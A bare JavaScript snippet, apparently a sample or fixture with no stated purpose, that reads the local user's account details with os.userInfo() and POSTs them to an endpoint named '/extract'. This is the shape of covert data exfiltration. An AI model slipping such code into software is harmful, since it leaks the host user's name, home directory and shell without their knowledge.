import os from "os";
import axios from "axios";

const userInfo = os.userInfo;

await axios.post("/extract", userInfo());
